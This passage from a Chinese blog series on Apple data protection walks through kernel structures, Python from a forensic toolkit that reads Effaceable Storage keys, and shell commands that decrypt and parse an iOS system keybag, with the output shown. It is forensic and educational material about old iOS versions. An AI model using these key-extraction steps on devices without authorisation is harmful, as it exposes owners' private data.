class=\"title\">cat_desc</span> <span class=\"title\">c_desc</span>;</span>                 <span class=\"comment\">/* cnode&#x27;s descriptor */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cat_attr</span> <span class=\"title\">c_attr</span>;</span>                 <span class=\"comment\">/* cnode&#x27;s attributes */</span></span><br><span class=\"line\">    TAILQ_HEAD(hfs_originhead, linkorigin) c_originlist;  <span class=\"comment\">/* hardlink origin cache */</span></span><br><span class=\"line\">    TAILQ_HEAD(hfs_hinthead, directoryhint) c_hintlist;  <span class=\"comment\">/* readdir directory hint list */</span></span><br><span class=\"line\">    <span class=\"type\">int16_t</span>         c_dirhinttag;           <span class=\"comment\">/* directory hint tag */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">union</span> &#123;</span></span><br><span class=\"line\">        <span class=\"type\">int16_t</span>     cu_dirhintcnt;          <span class=\"comment\">/* directory hint count */</span></span><br><span class=\"line\">        <span class=\"type\">int16_t</span>     cu_syslockcount;        <span class=\"comment\">/* system file use only */</span></span><br><span class=\"line\">    &#125; c_union;</span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>       c_dirchangecnt;         <span class=\"comment\">/* changes each insert/delete (in-core only) */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">filefork</span> *<span class=\"title\">c_datafork</span>;</span>            <span class=\"comment\">/* cnode&#x27;s data fork */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">filefork</span> *<span class=\"title\">c_rsrcfork</span>;</span>            <span class=\"comment\">/* cnode&#x27;s rsrc fork */</span></span><br><span class=\"line\">    <span class=\"type\">atomicflag_t</span>    c_touch_acctime;</span><br><span class=\"line\">    <span class=\"type\">atomicflag_t</span>    c_touch_chgtime;</span><br><span class=\"line\">    <span class=\"type\">atomicflag_t</span>    c_touch_modtime;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> HFS_COMPRESSION</span></span><br><span class=\"line\">    decmpfs_cnode  *c_decmp;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span> <span class=\"comment\">/* HFS_COMPRESSION */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> CONFIG_PROTECT</span></span><br><span class=\"line\">    <span class=\"type\">cprotect_t</span>      c_cpentry;              <span class=\"comment\">/* content protection data */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-cprotect-的数据结构\"><a href=\"#2-cprotect-的数据结构\" class=\"headerlink\" title=\"2. cprotect 的数据结构\"></a>2. cprotect 的数据结构</h3><p>进一步分析 <code>cprotect</code> 的数据结构，包含了文件独有密钥 <code>cp_persistent_key</code>（密文）和类标记 <code>cp_pclass</code>，并且有持久化存储和运行态的两种格式。<br>请参见<a href=\"https://opensource.apple.com/source/xnu/xnu-1699.32.7/bsd/sys/cprotect.h\">https://opensource.apple.com/source/xnu/xnu-1699.32.7/bsd/sys/cprotect.h</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cprotect</span> *<span class=\"title\">cprotect_t</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * Runtime-only structure containing the content protection status </span></span><br><span class=\"line\"><span class=\"comment\"> * for the given file.  This is contained within the cnode </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cprotect</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">uint8_t</span>     cp_cache_key[CP_KEYSIZE];</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span>     cp_persistent_key[CP_WRAPPEDKEYSIZE];</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span>    cp_flags;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span>    cp_pclass;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * On-disk structure written as the per-file EA payload </span></span><br><span class=\"line\"><span class=\"comment\"> * All on-disk multi-byte fields for the CP XATTR must be stored</span></span><br><span class=\"line\"><span class=\"comment\"> * little-endian on-disk.  This means they must be endian swapped to</span></span><br><span class=\"line\"><span class=\"comment\"> * L.E on getxattr() and converted to LE on setxattr().</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cp_xattr</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">u_int16_t</span>   xattr_major_version;</span><br><span class=\"line\">    <span class=\"type\">u_int16_t</span>   xattr_minor_version;</span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>   flags;</span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>   persistent_class;</span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>   key_size;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span>     persistent_key[CP_WRAPPEDKEYSIZE];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Same is true for the root EA, all fields must be written little endian. */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cp_root_xattr</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">u_int16_t</span>   major_version;</span><br><span class=\"line\">    <span class=\"type\">u_int16_t</span>   minor_version;</span><br><span class=\"line\">    <span class=\"type\">u_int64_t</span>   flags;</span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>   reserved1;</span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>   reserved2;</span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>   reserved3;</span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>   reserved4;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、核心密钥提取\"><a href=\"#二、核心密钥提取\" class=\"headerlink\" title=\"二、核心密钥提取\"></a>二、核心密钥提取</h2><p>Github 上有一个取证软件包可以读取早期的 iOS 系统数据。请参见<a href=\"https://github.com/nabla-c0d3/iphone-dataprotection\">https://github.com/nabla-c0d3/iphone-dataprotection</a>。<br>基本原理是通过加载修改后的 IPSW 固件，将设备强制进入 DFU 模式，然后通过 SSH 命令行连接到恢复内存盘 (Restore Ramdisk)，从而直接获取系统控制权。<br>这些工具只能适配 iPhone 4 （iOS 5）之前的版本，随后苹果公司升级软件就无法越狱了。</p>\n<p>其中有一段 Python 代码用于读取<code>Effaceable Storge</code> 的三个核心密钥，文件路径是 <code>python_scripts/keystore/effaceable.py</code></p>\n<figure class=\"highlight py\"><table><tr><td class=\"code\"><pre><span class=\"line\">Dkey = <span class=\"number\">0x446B6579</span></span><br><span class=\"line\">EMF = <span class=\"number\">0x454D4621</span></span><br><span class=\"line\">BAG1 = <span class=\"number\">0x42414731</span></span><br><span class=\"line\">DONE = <span class=\"number\">0x444f4e45</span>   <span class=\"comment\">#locker sentinel</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Effaceable Stroge 的数据结构</span></span><br><span class=\"line\"><span class=\"comment\"># MAGIC (kL) | LEN (2bytes) | TAG (4) | DATA (LEN)</span></span><br><span class=\"line\">Locker = Struct(<span class=\"string\">&quot;Locker&quot;</span>,</span><br><span class=\"line\">                String(<span class=\"string\">&quot;magic&quot;</span>,<span class=\"number\">2</span>),</span><br><span class=\"line\">                ULInt16(<span class=\"string\">&quot;length&quot;</span>),</span><br><span class=\"line\">                <span class=\"type\">Union</span>(<span class=\"string\">&quot;tag&quot;</span>,</span><br><span class=\"line\">                      ULInt32(<span class=\"string\">&quot;int&quot;</span>),</span><br><span class=\"line\">                      String(<span class=\"string\">&quot;tag&quot;</span>,<span class=\"number\">4</span>))</span><br><span class=\"line\">                ,</span><br><span class=\"line\">                String(<span class=\"string\">&quot;data&quot;</span>, <span class=\"keyword\">lambda</span> ctx: ctx[<span class=\"string\">&quot;length&quot;</span>])</span><br><span class=\"line\">                )</span><br><span class=\"line\"></span><br><span class=\"line\">Lockers = RepeatUntil(<span class=\"keyword\">lambda</span> obj, ctx: obj.tag.<span class=\"built_in\">int</span> == DONE, Locker)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">EffaceableLockers</span>(<span class=\"title class_ inherited__\">object</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, data</span>):</span><br><span class=\"line\">        self.lockers = &#123;&#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> l <span class=\"keyword\">in</span> Lockers.parse(data):</span><br><span class=\"line\">            tag = l.tag.<span class=\"built_in\">int</span> &amp; ~<span class=\"number\">0x80000000</span></span><br><span class=\"line\">            tag = struct.pack(<span class=\"string\">&quot;&lt;L&quot;</span>, tag)[::-<span class=\"number\">1</span>]</span><br><span class=\"line\">            self.lockers[tag] = l.data</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 获取 DKey，使用 AESUnwrap 算法解包</span></span><br><span class=\"line\">    <span class=\"comment\"># 注意！ Python 的 AESUnwrap 函数的入参顺序与 RFC 3394 规范正好相反</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">get_DKey</span>(<span class=\"params\">self, k835</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> self.lockers.has_key(<span class=\"string\">&quot;Dkey&quot;</span>):        </span><br><span class=\"line\">            <span class=\"keyword\">return</span> AESUnwrap(k835, self.lockers[<span class=\"string\">&quot;Dkey&quot;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 获取 EMF，很明显兼容了 LwVM，使用 AESdecryptCBC 算法解密</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">get_EMF</span>(<span class=\"params\">self, k89b</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> self.lockers.has_key(<span class=\"string\">&quot;LwVM&quot;</span>):</span><br><span class=\"line\">            lwvm = AESdecryptCBC(self.lockers[<span class=\"string\">&quot;LwVM&quot;</span>], k89b)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> lwvm[-<span class=\"number\">32</span>:]</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> self.lockers.has_key(<span class=\"string\">&quot;EMF!&quot;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> AESdecryptCBC(self.lockers[<span class=\"string\">&quot;EMF!&quot;</span>][<span class=\"number\">4</span>:], k89b)</span><br></pre></td></tr></table></figure>\n\n<p>下图是 Effaceable Stroge 的数据示例，但是由于版本不同，与上面的 Python 代码并不一致。<br>浅蓝色是 length ，红色是 tag 标记，注意HFS 是大端字节顺序。<br>第一个标记：0x42414731 &#x3D; <code>BAG1</code>，长度 0x0034 &#x3D; 52 个字节<br>第二个标记：0xC46B6579 &#x3D; <code>key</code>，长度 0x0028 &#x3D; 40 个字节<br>第三个标记：0xC54D4621 &#x3D; <code>EMF!</code>，长度 0x0024 &#x3D; 36 个字节<br>第四个标记：0x444F4E45 &#x3D; <code>DONE</code>，长度 0x0000，这就是结束了！</p>\n<p><img src=\"/2022/11/13/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0/plog.png\" alt=\"plog\"></p>\n<h2 id=\"三、设备密钥包-Device-Bag\"><a href=\"#三、设备密钥包-Device-Bag\" class=\"headerlink\" title=\"三、设备密钥包 - Device Bag\"></a>三、设备密钥包 - Device Bag</h2><p>系统密钥包是一个加密的 <code>plist</code> 格式的二进制文件，存储了所有类密钥的数据，Apple 系统的数据解密实现方式见下图。</p>\n<p><img src=\"/2022/11/13/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0/daemon.png\" alt=\"Daemon\"></p>\n<p>基于上面的取证工具包，找到了一个读取设备密钥包的小工具。<br>请参见<a href=\"https://github.com/russtone/systembag.kb\">https://github.com/russtone/systembag.kb</a> 。</p>\n<h3 id=\"1-Device-Bag-的文件级解密\"><a href=\"#1-Device-Bag-的文件级解密\" class=\"headerlink\" title=\"1. Device Bag 的文件级解密\"></a>1. Device Bag 的文件级解密</h3><p>系统密钥包的默认存储路径是 <code>/private/var/keybags/systembag.kb</code>，如果是U盘引导启动，可能位于<code>/mnt/keybags/systembag.kb</code>。<br>参考其操作步骤，Device Bag 文件解封的处理流程是：</p>\n<ol>\n<li>安全隔区从<code>Effaceable Storage</code> 区域提取 <code>BAG1</code> ，以获得 key 和 iv 初始向量</li>\n<li>系统进程<code>MKBPayload</code>读取 <code>systembag.kb</code> 文件内容并进行解密，获得所有类密钥的密文<code>Class Key!</code></li>\n</ol>\n<p><img src=\"/2022/11/13/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0/keybag.png\" alt=\"二进制文件参考\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">get_bag1</span></span><br><span class=\"line\">iv = e859f45ec0a3ab208ec61477b74e92f0</span><br><span class=\"line\">key = 71ebb0dd387647d7b1c4d10161f5f0b622937867ffe437e41a02ccaacfe8ffb2</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">./decrypt_systembag.py -k 71ebb0dd387647d7b1c4d10161f5f0b622937867ffe437e41a02ccaacfe8ffb2 -i e859f45ec0a3ab208ec61477b74e92f0 -o example/keybag example/systembag.kb</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">./parse_keybag.py example/keybag</span></span><br><span class=\"line\">HEADER</span><br><span class=\"line\">  VERS = 4      // 2- iOS 4.3 ，3 - iOS 5</span><br><span class=\"line\">  TYPE = 0      // 0 - System，1 - Backup，3 - Escrow</span><br><span class=\"line\">  UUID = cf7591b3dfc64ce8b4c36018fba96374</span><br><span class=\"line\">  HMCK = e0d8a575d2af7d15bcb26de7688d7c84eb9a4711a845b3c5d56b49c94bdc4216f165ecb4ea97ec18   // HMAC 校验值</span><br><span class=\"line\">  WRAP = 1      // 1 - UID 保护</span><br><span class=\"line\">  SALT = a358808b695d260c8a21ec801ce43db3efafecda       // 用于 Passcode KDF 的参数？</span><br><span class=\"line\">  ITER = 50000                                          // 用于 Passcode KDF 的参数？</span><br><span class=\"line\">  TKMT = 0</span><br><span class=\"line\">  SART = 98</span><br><span class=\"line\">  UUID = 9ab835423fe14b8c99b4be0ae6b066a3</span><br><span class=\"line\">KEYS</span><br><span class=\"line\">  0:</span><br><span class=\"line\">    CLAS = 1    // NSFileProtectionComplete 类</span><br><span class=\"line\">    WRAP = 3    // 3 - UID &amp; Passcode Key 保护</span><br><span class=\"line\">    KTYP = 0</span><br><span class=\"line\">    WPKY = 150dd562e3c6a441a879e154617d758af77553121c2b70114e32f6ad87a5819b375c724adee094ee // 该类密钥的密文</span><br><span class=\"line\">    UUID = 9d4e1c3567cc41058b3d2ee381aaa48b</span><br><span class=\"line\">  1:</span><br><span class=\"line\">    CLAS = 2    // NSFileProtectionCompleteUnlessOpen 类</span><br><span class=\"line\">    WRAP = 3</span><br><span class=\"line\">    KTYP = 1</span><br><span class=\"line\">    WPKY = 0df35185f13495d49596531f38d7114e77134a91c16915a14f2531241a78afc0ae4deeaefd2d5933 // 类密钥，就是静态私钥！</span><br><span class=\"line\">    PBKY = 0252ce8f8acc7068e4ca64cab9227035460ed5cef0661818b382e88609b1a908       // 额外存储了静态公钥！</span><br><span class=\"line\">  2:</span><br><span class=\"line\">    UUID = 6f537c62fd22484095c2836b227a38eb</span><br><span class=\"line\">    CLAS = 3    // NSFileProtectionCompleteUntilFirstUserAuthentication 类</span><br><span class=\"line\">    WRAP = 3</span><br><span class=\"line\">    KTYP = 0</span><br><span class=\"line\">    WPKY = 055c81e0fbc7eac3eee65e92a64c53178a95a48df6b0fa0d0ed24f3eb6b2cac9105772f6cb32c391</span><br><span class=\"line\">  3:</span><br><span class=\"line\">    UUID = 9136f182f33b46c29499cc253c94a564</span><br><span class=\"line\">    CLAS = 5    // NSFileProtectionRecovery 类，保留未启用！</span><br><span class=\"line\">    WRAP = 3</span><br><span class=\"line\">    KTYP = 0</span><br><span class=\"line\">    WPKY = c5867706ef5cc9d03b7f098a9f1f583e58397a984a17173e8d8e685fc9d2ecbc8bb3c9d76ed89c71</span><br><span class=\"line\">  4:</span><br><span class=\"line\">    UUID = 4703951420ef4ceca92d3d6e35aceb02</span><br><span class=\"line\">    CLAS = 6</span><br><span class=\"line\">    WRAP = 3</span><br><span class=\"line\">    KTYP = 0</span><br><span class=\"line\">    WPKY = acb3be303c103526aee718633a1bd946720dd128460bf54bcee99408f9ffe281a96cf352eaf5c710</span><br><span class=\"line\">  5:</span><br><span class=\"line\">    UUID = e42e8612890b48c8bee12f7c3f5510f2</span><br><span class=\"line\">    CLAS = 7</span><br><span class=\"line\">    WRAP = 3</span><br><span class=\"line\">    KTYP = 0</span><br><span class=\"line\">    WPKY = 52a6d7f05a62ccf906ce449f26325f518ad468e6d53a98bff309ac89eba088983148bada67e29a36</span><br><span class=\"line\">  6:</span><br><span class=\"line\">    UUID = 34addd5fffcb4b619d377301e49b16d5</span><br><span class=\"line\">    CLAS = 8</span><br><span class=\"line\">    WRAP = 1</span><br><span class=\"line\">    KTYP = 0</span><br><span class=\"line\">    WPKY = 9f2ddbeeb002c9897f1486244cfa5cb948cd13c23d7c480513b8be36f46a11d1</span><br><span class=\"line\">  7:</span><br><span class=\"line\">    UUID = c703f8b157b44418acbb3de1d5f35178</span><br><span class=\"line\">    CLAS = 9</span><br><span class=\"line\">    WRAP = 3</span><br><span class=\"line\">    KTYP = 0</span><br><span class=\"line\">    WPKY = a777da0779ee752fb9d7f0651ed83c7c16945af3723f30d8d82afc26eb076b99220ebffeebf1b53c</span><br><span class=\"line\">  8:</span><br><span class=\"line\">    UUID = a72aa7d9d1ea4ab6ab6a27c89961d4d4</span><br><span class=\"line\">    CLAS = 10</span><br><span class=\"line\">    WRAP = 3</span><br><span class=\"line\">    KTYP = 0</span><br><span class=\"line\">    WPKY = b7ac60ea56917249d094fd21c44728cd77621f566e7ea6538c3475a2b3d43c6061b0fbc320eb7376</span><br><span class=\"line\">  9:</span><br><span class=\"line\">    UUID = 568dfdd2f8ae4edd9ae7f22bba3c9ce2</span><br><span class=\"line\">    CLAS = 11</span><br><span class=\"line\">    WRAP = 1</span><br><span class=\"line\">    KTYP = 0</span><br><span class=\"line\">    WPKY = 44389e92846f2c7bf1294be2fcaf88153638a881197590df03e0303b1af6ac47</span><br></pre></td></tr></table></figure>\n\n<p>请注意：</p>\n<ul>\n<li>缺少 Class 4 的类密钥，因为 DKey 的存储路径已经转移到 Effaceable Storage</li>\n<li>前面 5 个数据项是 Class 类密钥，后面 6 个数据项是 KeyChain 钥匙串的密钥</li>\n</ul>\n<figure class=\"highlight py\"><table><tr><td class=\"code\"><pre><span class=\"line\">PROTECTION_CLASSES=&#123;</span><br><span class=\"line\">    <span class=\"comment\"># 文件保护类型的定义</span></span><br><span class=\"line\">    <span class=\"number\">1</span>:<span class=\"string\">&quot;NSFileProtectionComplete&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">2</span>:<span class=\"string\">&quot;NSFileProtectionCompleteUnlessOpen&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">3</span>:<span class=\"string\">&quot;NSFileProtectionCompleteUntilFirstUserAuthentication&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">4</span>:<span class=\"string\">&quot;NSFileProtectionNone&quot;</span>,       <span class=\"comment\"># 已废弃，DKey 的存储位置改为 Effaceable Storage</span></span><br><span class=\"line\">    <span class=\"number\">5</span>:<span class=\"string\">&quot;NSFileProtectionRecovery?&quot;</span>,  <span class=\"comment\"># 未使用</span></span><br><span class=\"line\">    <span class=\"comment\"># 钥匙串类型的定义</span></span><br><span class=\"line\">    <span class=\"number\">6</span>: <span class=\"string\">&quot;kSecAttrAccessibleWhenUnlocked&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">7</span>: <span class=\"string\">&quot;kSecAttrAccessibleAfterFirstUnlock&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">8</span>: <span class=\"string\">&quot;kSecAttrAccessibleAlways&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">9</span>: <span class=\"string\">&quot;kSecAttrAccessibleWhenUnlockedThisDeviceOnly&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">10</span>: <span class=\"string\">&quot;kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">11</span>: <span class=\"string\">&quot;kSecAttrAccessibleAlwaysThisDeviceOnly&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Class-Key-的解封\"><a href=\"#2-Class-Key-的解封\" class=\"headerlink\" title=\"2. Class Key 的解封\"></a>2. Class Key 的解封</h3><p><img src=\"/2022/11/13/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0/unlock2.png\" alt=\"核心流程\"><br>对于这些 <code>Class Key!</code>, 有3种解密方式：</p>\n<ul>\n<li>WRAP &#x3D; 1 ：只有 Device Key 保护，通过 AES_Decrypt 算法解密</li>\n<li>WRAP &#x3D; 2 ：只有 Passcode Key 保护，通过 AES_Unwrap 算法解封</li>\n<li>WRAP &#x3D; 3 ：模式1 + 模式2，首先使用 Passcode Key 解封，再使用 Device Key 解密</li>\n</ul>\n<p>更加具体的算法描述，请参见下图。<br><img src=\"/2022/11/13/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0/unlock.png\" alt=\"unlock\"></p>\n<ol>\n<li>用户（开机时）必须手工输入 passcode</li>\n<li>安全隔区提取 Salt 盐值和 Iter 迭代次数，再次计算 Passcode Key<br> <code>Passcode Key = PBKDF2(passcode, salt, iter, outputLength=32)</code></li>\n<li>安全隔区使用 Passcode Key，<strong>逐一</strong>解封各个类密钥<br> <code>Class key! = AES_UNWRAP(Passcode Key, Class Key!!)</code></li>\n<li>类密钥解封完成后，与<code>systembag.kb</code>文件头部的 <code>HMCK</code>进行校验<br> 如果失败，可能是 passcode 输入错误，或者是硬件被更换。</li>\n<li>安全隔区使用基于 UID 的 Key 0x835 对类密钥进行解密<br> <code>Class key = AES_DECRYPT(Key 0x835, Class Key!)</code></li>\n<li>现在类密钥已经出现在内存中，可以用于解封文件 metadata 中的<code>per-file key</code></li>\n</ol>\n<h2 id=\"四、遗留问题\"><a href=\"#四、遗留问题\" class=\"headerlink\" title=\"四、遗留问题\"></a>四、遗留问题</h2><ol>\n<li>systembag.kb 文件头部包含的 Salt 和 HMCK 字段，是否已经转移到安全隔区的第二代存储组件了呢？</li>\n</ol>\n<ul>\n<li><p>标头（Header）:</p>\n<ul>\n<li>VRES：版本号，例如 3 &#x3D; iOS 5</li>\n<li>TYPE：钥匙包类型 ，0 &#x3D; system, 1 &#x3D; backup, 3 &#x3D; escrow, 2 &#x3D; iCloud Backup</li>\n<li>UUID：Apple 规定的应用级 UID</li>\n<li>HMCK：可选，用于数据校验，如果密钥包已签名</li>\n<li>WRAP：包裹类型，1 &#x3D; UID保护， 2 &#x3D; PBKDF2保护</li>\n<li>其它字段：可能有 ITER（随机盐），ITER（迭代次数）等</li>\n</ul>\n</li>\n<li><p>类密钥列表（List of class keys）:</p>\n<ul>\n<li>UUID：Apple 规定的应用级 UID</li>\n<li>CLAS：文件保护类型（A-D），或者钥匙串保护类型</li>\n<li>WRAP：包裹类型，1 &#x3D; 仅UID派生，2 &#x3D; passcode key，3 &#x3D; 1&amp;2</li>\n<li>WPKY：类密钥包裹后的密文</li>\n<li>其它字段：可能有非对称的公钥等</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h2 id=\"附录：有意思的一些企业信息\"><a href=\"#附录：有意思的一些企业信息\" class=\"headerlink\" title=\"附录：有意思的一些企业信息\"></a>附录：有意思的一些企业信息</h2><ol>\n<li>Sogeti 是凯捷咨询集团（Capgemini）旗下从事本地化技术服务的子公司，1967年在法国创建。该集团还包括 CAP 、GEMINI 和安永咨询等公司，是欧洲最大的IT外包服务商。<br>  <a href=\"iPhone_Data_Protection_in_Depth.pdf\">iPhone数据保护的深度分析 - iPhone Data Protection in Depth</a></li>\n<li>NCC Group 成立于1999年6月，当时美国国家计算中心（the National Computing Centre）将其商业部门出售给其现有的管理团队，是一个专业的安全审计机构。<br>  <a href=\"2016-BSidesROC-iOSCrypto.pdf\">iOS加密技术高级分析 -  A (not-so-quick) Primer on iOS Encryption</a></li>\n<li>ElcomSoft Co. Ltd.公司于1990年在美国成立，是国际领先的数字取证工具开发公司。<br>  <a href=\"OWASP_BeNeLux_Day_2011_-_A._Belenko_-_Overcoming_iOS_Data_Protection.pdf\">iOS取证技术 - iOS Forensics: Overcoming iPhone Data Protection</a><br>  <a href=\"0721C6_Andrey.Belenko_Evolution.of.iOS.Data.Protection.pdf\">iOS 数据保护的演变</a></li>\n<li>高田科技是一个台湾的科技企业，文档都是中文的，不过是繁体字。<br>  <a href=\"https://www.kaotenforensic.com/ios/\">iOS取证技术的系列文档</a></li>\n<li><a href=\"https://www.ibas.com/fi\">ibas</a> 是一个芬兰的科技公司，主要业务是数据恢复和信息技术取证。<br>  <a href=\"https://www.youtube.com/watch?v=5Es3wRSe3kY\">iPhone裸闪存数据恢复的视频演讲 - iPhone raw NAND recovery and forensics</a></li>\n<li>这是一篇比较完整的技术论文，Peter Teufl 等作者来自于奥地利格拉茨技术大学。<br>  <a href=\"iOS_Encryption_Systems.pdf\">iOS加密系统 - iOS Encryption Systems</a></li>\n<li>盘古石，是北京奇安信科技有限公司旗下专注于电子数据取证技术研发的团队。<br>  <a href=\"https://qz.qianxin.com/news-3-1.html\">https://qz.qianxin.com/</a></li>\n</ol>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.cnblogs.com/xumenger/p/4491425.html\">Linux文件系统简介</a></li>\n<li><a href=\"https://rfc2cn.com/rfc3394.html\">ATS-Key-Wrap 算法的 RFC 3394 规范</a></li>\n<li><a href=\"https://blog.csdn.net/XiNGRZ/article/details/5332915\">解密iPhone的固件</a></li>\n<li><a href=\"https://www.anquanke.com/post/id/237769\">通过侧信道分析加强对iPhone用户身份验证的暴力破解攻击</a></li>\n</ul>\n<h3 id=\"Apple官方文档\"><a href=\"#Apple官方文档\" class=\"headerlink\" title=\"Apple官方文档\"></a>Apple官方文档</h3><ul>\n<li><a href=\"apple-platform-security-guide.pdf\">Apple 平台安全白皮书 - 2022年英文版</a></li>\n<li><a href=\"apple%E5%B9%B3%E5%8F%B0%E5%AE%89%E5%85%A8%E7%99%BD%E7%9A%AE%E4%B9%A6-2021%E4%B8%AD%E6%96%87%E7%89%88.pdf\">Apple 平台安全白皮书 - 2021年中文版</a></li>\n<li><a href=\"Apple_T2_Security_Chip_Overview.pdf\">Apple T2 安全芯片概览</a></li>\n<li><a href=\"Apple-File-System-Reference.pdf\">APFS 文件系统参考手册</a></li>\n</ul>\n"},{"title":"Apple数据保护技术专题之二：密钥层级","url":"/2022/11/13/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%BA%8C%EF%BC%9A%E5%AF%86%E9%92%A5%E5%B1%82%E7%BA%A7/","content":"<p>EMF Key &#x3D; file-system master encryption key</p>\n<h2 id=\"四、Dkey-密钥的演进分析\"><a href=\"#四、Dkey-密钥的演进分析\" class=\"headerlink\" title=\"四、Dkey 密钥的演进分析\"></a>四、Dkey 密钥的演进分析</h2><p>根据 iOS 的初期设计，<code>Class D</code>是所有用户数据文件的默认类型，其类密钥就是 DKey，即大多数文件的<code>per-file key</code>都通过 Dkey 进行封装。<br>此时 DKey 的存储路径就是<code>systembag.kb</code>文件的 <code>Class 4</code> 字段，当然受到了基于 UID 的 Key 0x835 的保护。</p>\n<p>由于 DKey 直接保存在一个普通的数据文件中，任何具有 root 